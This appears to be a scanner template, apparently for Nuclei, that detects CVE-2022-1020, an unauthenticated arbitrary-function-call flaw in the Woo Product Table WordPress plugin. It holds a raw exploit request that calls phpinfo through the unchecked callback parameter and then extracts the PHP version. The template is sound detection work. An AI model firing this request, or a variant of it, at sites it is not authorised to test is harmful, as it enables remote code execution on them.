http:
- extractors:
  - group: 1
    part: body
    regex:
    - '>PHP Version <\/td><td class="v">([0-9.]+)'
    type: regex
  matchers:
  - condition: and
    type: word
    words:
    - PHP Extension
    - PHP Version
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-admin/admin-ajax.php?action=wpt_admin_update_notice_option HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    option_key=a&perpose=update&callback=phpinfo

    '
id: CVE-2022-1020
info:
  author: Akincibor
  classification:
    cpe: cpe:2.3:a:codeastrology:woo_product_table:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2022-1020
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-352
    epss-percentile: 0.99691
    epss-score: 0.92138
  description: WordPress WooCommerce plugin before 3.1.2 does not have authorisation
    and CSRF checks in the wpt_admin_update_notice_option AJAX action (available to
    both unauthenticated and authenticated users), as well as does not validate the
    callback parameter, allowing unauthenticated attackers to call arbitrary functions
    with either none or one user controlled argument.
  impact: 'It allows remote code execution on the affected system.

    '
  metadata:
    framework: wordpress
    max-request: 1
    product: woo_product_table
    vendor: codeastrology
  name: WordPress WooCommerce <3.1.2 - Arbitrary Function Call
  reference:
  - https://wpscan.com/vulnerability/04fe89b3-8ad1-482f-a96d-759d1d3a0dd5
  - https://nvd.nist.gov/vuln/detail/CVE-2022-1020
  remediation: 'Update WordPress WooCommerce plugin to version 3.1.2 or later to mitigate
    the vulnerability.

    '
  severity: critical
  tags: cve,cve2022,wpscan,wp,wp-plugin,wordpress,unauth,codeastrology,vkev,vuln
